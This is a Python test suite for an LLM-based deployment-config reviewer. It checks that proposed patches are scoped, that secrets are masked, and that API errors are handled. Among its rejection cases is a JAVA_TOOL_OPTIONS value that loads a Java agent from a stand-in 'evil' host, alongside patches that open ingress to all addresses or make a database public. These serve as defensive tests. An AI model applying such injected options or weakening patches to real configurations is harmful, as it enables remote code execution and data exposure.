from __future__ import annotations

import json
from types import SimpleNamespace
from typing import Any

import anthropic
import httpx
import pytest

from review_ai.errors import TransientError
from review_ai.judge.fake_llm import FAKES, ScriptedLLM, oracle_review
from review_ai.judge.llm import CachedLLM, ClaudeLLM, LlmRefused, LlmUnavailable
from review_ai.judge.node import judge_unavailable, make_judge
from review_ai.judge.prompt import build_request
from review_ai.judge.validate import validate_output
from review_ai.masking import mask_spec
from review_ai.retrieval.file_retriever import FileRetriever
from review_ai.spec.deploy_spec import DeploySpec
from review_ai.static_check import run_static_check
from tests.conftest import load_sample_dict


async def prepared(name: str) -> dict[str, Any]:
    spec = load_sample_dict(name)
    findings = run_static_check(DeploySpec.model_validate(spec))
    docs = await FileRetriever().search(findings, spec["target"]["env"])
    return {"deploy_spec": spec, "findings": findings, "retrieved_docs": docs, "target_env": spec["target"]["env"]}


def oracle_text(state: dict[str, Any]) -> dict[str, Any]:
    return oracle_review(build_request(state["deploy_spec"], state["findings"], state["retrieved_docs"], state["target_env"]))


# ── 프롬프트 ─────────────────────────────────────────────────────


async def test_prompt_masks_secrets_and_is_hash_stable() -> None:
    state = await prepared("06-human-plaintext-secret.yaml")
    a = build_request(state["deploy_spec"], state["findings"], state["retrieved_docs"], "aws")
    b = build_request(state["deploy_spec"], state["findings"], state["retrieved_docs"], "aws")
    assert "sample-not-a-real-token-0000" not in a.user
    assert "***MASKED***" in a.user
    assert a.input_hash == b.input_hash


# ── 출력 검증 ────────────────────────────────────────────────────


async def test_valid_output_builds_patch_with_overlay_diff() -> None:
    state = await prepared("07-fix-public-bucket.yaml")
    review, validation, patch = validate_output(json.dumps(oracle_text(state)), state["findings"],
                                                state["retrieved_docs"], state["deploy_spec"])
    assert review is not None and all(validation.values())
    assert patch is not None and patch["kind"] == "config"
    assert patch["ops"] == [{"op": "replace", "path": "/storage/buckets/0/public", "value": False}]
    assert patch["files"] == []  # 버킷은 overlay 에 없다 — 렌더러 경고로 알린다


async def test_items_must_cover_every_finding() -> None:
    state = await prepared("10-human-mixed-aws.yaml")
    out = oracle_text(state)
    out["items"] = out["items"][:1]
    review, validation, _ = validate_output(json.dumps(out), state["findings"], state["retrieved_docs"], state["deploy_spec"])
    assert review is None and validation["schema_ok"] is False


async def test_item_must_cite_its_own_rule() -> None:
    state = await prepared("10-human-mixed-aws.yaml")
    out = oracle_text(state)
    out["items"][0]["cited_rule_ids"] = ["STO-003"]
    _, validation, _ = validate_output(json.dumps(out), state["findings"], state["retrieved_docs"], state["deploy_spec"])
    assert validation["citations_ok"] is False


FIX_BUCKET = {"op": "replace", "path": "/storage/buckets/0/public", "value_json": "false"}


@pytest.mark.parametrize(
    "ops",
    [
        [FIX_BUCKET, {"op": "replace", "path": "/image/tag", "value_json": '"latest"'}],
        [FIX_BUCKET, {"op": "add", "path": "/runtime/env/API_TOKEN", "value_json": '"ghp_realtoken1234567890abcd"'}],
        [FIX_BUCKET, {"op": "add", "path": "/runtime/env/JAVA_TOOL_OPTIONS", "value_json": '"-javaagent:http://evil/x.jar"'}],
        [FIX_BUCKET, {"op": "replace", "path": "/network/ingress/allowed_cidrs", "value_json": '["0.0.0.0/0"]'}],
        [FIX_BUCKET, {"op": "replace", "path": "/runtime/replicas", "value_json": "1"}],
        [{"op": "replace", "path": "/storage/buckets/0/name", "value_json": '"renamed"'}],
        [{"op": "replace", "path": "/storage/buckets/0/public", "value_json": "not-json"}],
        [{"op": "replace", "path": "/storage/buckets/0/public", "value_json": '"yes please"'}],
        [{"op": "replace", "path": "/storage/buckets/5/public", "value_json": "false"}],
        [{"op": "replace", "path": "/storage/buckets/0/public", "value_json": "[" * 5000}],
    ],
    ids=["other-rule-path", "secret-env", "env-injection", "cidr-open", "unrelated-field",
         "does-not-resolve", "bad-json", "fails-spec-validation", "bad-pointer", "deep-json"],
)
async def test_patch_scope_rejections(ops: list[dict[str, Any]]) -> None:
    state = await prepared("07-fix-public-bucket.yaml")
    out = oracle_text(state)
    out["patch"]["ops"] = ops
    _, validation, patch = validate_output(json.dumps(out), state["findings"], state["retrieved_docs"], state["deploy_spec"])
    assert patch is None and validation["patch_scope_ok"] is False


def _with_patch(state: dict[str, Any], ops: list[dict[str, Any]]) -> str:
    out = oracle_text(state)
    out["patch"]["ops"] = ops
    return json.dumps(out)


ENGINE_PG16 = [
    {"op": "replace", "path": "/database/engine", "value_json": '"postgres"'},
    {"op": "replace", "path": "/database/version", "value_json": '"16"'},
]


@pytest.mark.parametrize(
    ("sample", "ops"),
    [
        ("05-fix-engine-unsupported-local.yaml", [{"op": "replace", "path": "/database", "value_json": '{"engine": "none"}'}]),
        ("05-fix-engine-unsupported-local.yaml", [{"op": "replace", "path": "/database/engine", "value_json": '"none"'}]),
        ("05-fix-engine-unsupported-local.yaml", [{"op": "replace", "path": "/database/placement", "value_json": '"external"'}]),
        ("05-fix-engine-unsupported-local.yaml",
         [*ENGINE_PG16, {"op": "add", "path": "/database/publicly_accessible", "value_json": "true"}]),
        ("05-fix-engine-unsupported-local.yaml",
         [*ENGINE_PG16, {"op": "add", "path": "/database/backup_retention_days", "value_json": "0"}]),
        ("07-fix-public-bucket.yaml", [{"op": "remove", "path": "/storage/buckets/0"}]),
        ("07-fix-public-bucket.yaml", [{"op": "replace", "path": "/storage/buckets/0", "value_json":
         '{"name": "sample-app-uploads", "public": false, "versioning": false, "encryption": false}'}]),
        ("07-fix-public-bucket.yaml", [{"op": "replace", "path": "/storage", "value_json": "{}"}]),
        ("03-fix-sqlite-replicas-gcp.yaml", [{"op": "replace", "path": "/database", "value_json": '{"engine": "none"}'}]),
    ],
    ids=["db-replaced-by-none", "engine-none", "placement-external", "db-made-public", "backup-dropped",
         "bucket-removed", "bucket-protection-off", "storage-emptied", "sqlite-db-removed"],
)
async def test_patch_cannot_fix_by_removing_or_weakening(sample: str, ops: list[dict[str, Any]]) -> None:
    """대상 finding 만 사라지면 되는 게 아니다 — DB·버킷을 지우거나 보호를 끄는 '고친 척' 패치는 버린다."""
    state = await prepared(sample)
    _, validation, patch = validate_output(_with_patch(state, ops), state["findings"], state["retrieved_docs"],
                                           state["deploy_spec"])
    assert patch is None and validation["patch_scope_ok"] is False


async def test_whole_object_replace_passes_when_only_allowed_field_changes() -> None:
    state = await prepared("07-fix-public-bucket.yaml")
    ops = [{"op": "replace", "path": "/storage/buckets/0", "value_json":
            '{"name": "sample-app-uploads", "public": false, "versioning": true, "encryption": true}'}]
    _, validation, patch = validate_output(_with_patch(state, ops), state["findings"], state["retrieved_docs"],
                                           state["deploy_spec"])
    assert patch is not None and validation["patch_scope_ok"] is True


async def test_patch_cannot_write_masked_value_back() -> None:
    """가린 사본에서는 변화 없음이지만, 원본에 적용하면 실제 값을 ***MASKED*** 로 덮는 op."""
    state = await prepared("07-fix-public-bucket.yaml")
    state["deploy_spec"]["storage"]["buckets"][0]["name"] = "uploader:pw1234@bucket-host"
    state["deploy_spec"] = mask_spec(state["deploy_spec"])
    state["findings"] = run_static_check(DeploySpec.model_validate(state["deploy_spec"]))
    ops = [{"op": "replace", "path": "/storage/buckets/0", "value_json":
            '{"name": "***MASKED***", "public": false, "versioning": true, "encryption": true}'}]
    _, _, patch = validate_output(_with_patch(state, ops), state["findings"], state["retrieved_docs"],
                                  state["deploy_spec"])
    assert patch is None


async def test_patch_cannot_drop_persistent_volume() -> None:
    state = await prepared("02-pass-local-sqlite.yaml")
    state["deploy_spec"]["runtime"]["replicas"] = 2  # DB-003
    state["findings"] = run_static_check(DeploySpec.model_validate(state["deploy_spec"]))
    out = oracle_text(state)
    out["patch"]["ops"].append({"op": "replace", "path": "/database/engine", "value_json": '"postgres"'})
    _, validation, patch = validate_output(json.dumps(out), state["findings"], [], state["deploy_spec"])
    assert patch is None  # engine_policy preserve 인데 엔진을 바꿈


async def test_engine_conversion_needs_allow_convert_and_no_data() -> None:
    state = await prepared("03-fix-sqlite-replicas-gcp.yaml")  # allow_convert, 첫 배포
    convert = [
        {"op": "replace", "path": "/database/engine", "value_json": '"postgres"'},
        {"op": "replace", "path": "/database/placement", "value_json": '"in-cluster"'},
        {"op": "add", "path": "/database/version", "value_json": '"16"'},
        {"op": "remove", "path": "/database/volume"},
        {"op": "add", "path": "/database/env_var", "value_json": '"DATABASE_URL"'},
    ]
    out = oracle_text(state)
    out["patch"]["ops"] = convert
    _, _, patch = validate_output(json.dumps(out), state["findings"], [], state["deploy_spec"])
    assert patch is None  # 전환하면 SEC-005(접속 시크릿 없음)가 새로 생긴다 — 재검사가 막는다


async def test_llm_free_text_is_redacted_and_capped() -> None:
    state = await prepared("07-fix-public-bucket.yaml")
    out = oracle_text(state)
    out["items"][0]["why"] = "토큰 ghp_abcdefghijklmnopqrstuvwxyz0123 를 지우세요"
    out["extra_opinions"] = ["postgres://u:pw@h/db 로 바꾸세요"]
    review, _, _ = validate_output(json.dumps(out), state["findings"], state["retrieved_docs"], state["deploy_spec"])
    assert "ghp_" not in review.items[0].why and "pw@" not in review.extra_opinions[0]
    out["extra_opinions"] = ["x"] * 50
    too_many, validation, _ = validate_output(json.dumps(out), state["findings"], [], state["deploy_spec"])
    assert too_many is None and validation["schema_ok"] is False


async def test_patch_cannot_target_forbidden_finding() -> None:
    state = await prepared("10-human-mixed-aws.yaml")
    out = oracle_text(state)
    out["patch"]["target_finding_ids"] = [f["finding_id"] for f in state["findings"]]
    _, validation, _ = validate_output(json.dumps(out), state["findings"], state["retrieved_docs"], state["deploy_spec"])
    assert validation["patch_scope_ok"] is False


# ── 노드 ─────────────────────────────────────────────────────────


async def test_node_low_only_skips_llm() -> None:
    llm = FAKES["oracle"]()
    out = await make_judge(llm)(await prepared("01-pass-sample-app-aws.yaml"))
    assert llm.calls == 0 and out["decision"]["verdict"] == "pass" and out["patch"] is None
    assert out["decision"]["items"][0]["why"].startswith("경고:")


async def test_node_returns_patch_only_for_fix() -> None:
    out = await make_judge(FAKES["oracle"]())(await prepared("07-fix-public-bucket.yaml"))
    assert out["decision"]["verdict"] == "fix" and out["patch"] is not None
    assert out["decision"]["llm"]["prompt_version"] == "judge-v3"
    human = await make_judge(FAKES["oracle"]())(await prepared("10-human-mixed-aws.yaml"))
    assert human["decision"]["verdict"] == "needs_human" and human["patch"] is None


async def test_node_refusal_is_domain_result() -> None:
    class Refusing:
        model = "x"

        async def complete(self, request: Any) -> Any:
            raise LlmRefused("no")

    out = await make_judge(Refusing())(await prepared("07-fix-public-bucket.yaml"))
    assert out["decision"]["reasons"] == ["CITATION_INVALID"] and out["decision"]["llm"]["refused"] is True


async def test_node_transient_error_propagates() -> None:
    class Flaky:
        model = "x"

        async def complete(self, request: Any) -> Any:
            raise TransientError("timeout")

    with pytest.raises(TransientError):
        await make_judge(Flaky())(await prepared("07-fix-public-bucket.yaml"))


async def test_judge_unavailable_helper_for_pipeline() -> None:
    out = judge_unavailable(await prepared("07-fix-public-bucket.yaml"))
    assert out["decision"]["reasons"] == ["LLM_UNAVAILABLE"] and out["patch"] is None


async def test_cached_llm_calls_once_per_input() -> None:
    inner = ScriptedLLM(oracle_review)
    cached = CachedLLM(inner)
    state = await prepared("07-fix-public-bucket.yaml")
    request = build_request(state["deploy_spec"], state["findings"], state["retrieved_docs"], "aws")
    await cached.complete(request)
    await cached.complete(request)
    assert inner.calls == 1


# ── Claude 클라이언트 (네트워크 없이) ───────────────────────────


def _status_error(cls: type, status: int, message: str | None = None) -> Exception:
    response = httpx.Response(status, request=httpx.Request("POST", "https://api.anthropic.com/v1/messages"))
    body = {"type": "error", "error": {"type": "invalid_request_error", "message": message}} if message else None
    return cls("x", response=response, body=body)


# 2026-10-08 실측: 잔액 부족은 401 이 아니라 400 invalid_request_error 로 온다
CREDIT_TOO_LOW = ("Your credit balance is too low to access the Anthropic API. "
                  "Please go to Plans & Billing to upgrade or purchase credits.")


class _FakeMessages:
    def __init__(self, behavior: Any) -> None:
        self.behavior = behavior
        self.kwargs: dict[str, Any] = {}

    async def create(self, **kwargs: Any) -> Any:
        self.kwargs = kwargs
        if isinstance(self.behavior, Exception):
            raise self.behavior
        return self.behavior


def _client(behavior: Any) -> Any:
    return SimpleNamespace(messages=_FakeMessages(behavior))


async def test_claude_sends_structured_output_and_cached_system() -> None:
    usage = SimpleNamespace(model_dump=lambda exclude_none: {"input_tokens": 10, "output_tokens": 5})
    message = SimpleNamespace(stop_reason="end_turn", model="claude-opus-5-5", usage=usage,
                              content=[SimpleNamespace(type="text", text='{"items": []}')])
    client = _client(message)
    state = await prepared("07-fix-public-bucket.yaml")
    response = await ClaudeLLM(client).complete(build_request(state["deploy_spec"], state["findings"], [], "aws"))
    sent = client.messages.kwargs
    assert sent["output_config"]["format"]["type"] == "json_schema"
    assert sent["system"][0]["cache_control"] == {"type": "ephemeral"}
    assert "temperature" not in sent
    assert response.text == '{"items": []}' and response.usage["input_tokens"] == 10


@pytest.mark.parametrize(
    ("error", "expected"),
    [
        (_status_error(anthropic.RateLimitError, 429), TransientError),
        (_status_error(anthropic.InternalServerError, 500), TransientError),
        (_status_error(anthropic.APIStatusError, 529), TransientError),
        (_status_error(anthropic.AuthenticationError, 401), LlmUnavailable),
        (_status_error(anthropic.BadRequestError, 400, CREDIT_TOO_LOW), LlmUnavailable),
        (_status_error(anthropic.BadRequestError, 400), anthropic.BadRequestError),
        (_status_error(anthropic.BadRequestError, 400, "max_tokens: field required"), anthropic.BadRequestError),
    ],
    ids=["429", "500", "529", "401", "400-credit-too-low", "400-is-bug", "400-request-bug"],
)
async def test_claude_error_mapping(error: Exception, expected: type) -> None:
    state = await prepared("07-fix-public-bucket.yaml")
    with pytest.raises(expected):
        await ClaudeLLM(_client(error)).complete(build_request(state["deploy_spec"], state["findings"], [], "aws"))


async def test_claude_refusal() -> None:
    message = SimpleNamespace(stop_reason="refusal", model="m", usage=None, content=[])
    state = await prepared("07-fix-public-bucket.yaml")
    with pytest.raises(LlmRefused):
        await ClaudeLLM(_client(message)).complete(build_request(state["deploy_spec"], state["findings"], [], "aws"))


def test_claude_without_key_is_unavailable(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    with pytest.raises(LlmUnavailable):
        ClaudeLLM()


async def test_cached_llm_dedupes_concurrent_calls_and_bounds_size() -> None:
    import asyncio

    class Slow:
        model = "slow"
        calls = 0

        async def complete(self, request: Any) -> Any:
            Slow.calls += 1
            await asyncio.sleep(0.01)
            return await ScriptedLLM(oracle_review).complete(request)

    cached = CachedLLM(Slow(), max_entries=1)
    a = await prepared("07-fix-public-bucket.yaml")
    b = await prepared("03-fix-sqlite-replicas-gcp.yaml")
    ra = build_request(a["deploy_spec"], a["findings"], [], "aws")
    rb = build_request(b["deploy_spec"], b["findings"], [], "gcp")
    await asyncio.gather(*(cached.complete(ra) for _ in range(5)))
    assert Slow.calls == 1
    await cached.complete(rb)
    await cached.complete(ra)  # 크기 1 이라 ra 는 밀려났다
    assert Slow.calls == 3


async def test_unavailable_records_cause_in_meta() -> None:
    out = await make_judge(FAKES["unavailable"]())(await prepared("07-fix-public-bucket.yaml"))
    assert out["decision"]["llm"]["error"].startswith("unavailable")


async def test_patch_on_masked_spec_keeps_ops_without_overlay_diff() -> None:
    from review_ai.masking import mask_spec

    state = await prepared("07-fix-public-bucket.yaml")
    state["deploy_spec"]["runtime"]["env"] = {"STRIPE_KEY": "sk-live-abcdefghijklmnopqrstuvwxyz"}
    masked = mask_spec(state["deploy_spec"])
    findings = run_static_check(DeploySpec.model_validate(masked))
    target = next(f for f in findings if f["rule_id"] == "STO-003")
    out = {"items": [{"finding_id": f["finding_id"], "cited_rule_ids": [f["rule_id"]], "why": "x", "fix_kind": "config"}
                     for f in findings],
           "patch": {"ops": [FIX_BUCKET], "target_finding_ids": [target["finding_id"]]}}
    _, validation, patch = validate_output(json.dumps(out), findings, [], masked)
    assert validation["patch_scope_ok"] and patch is not None and patch["files"] == []
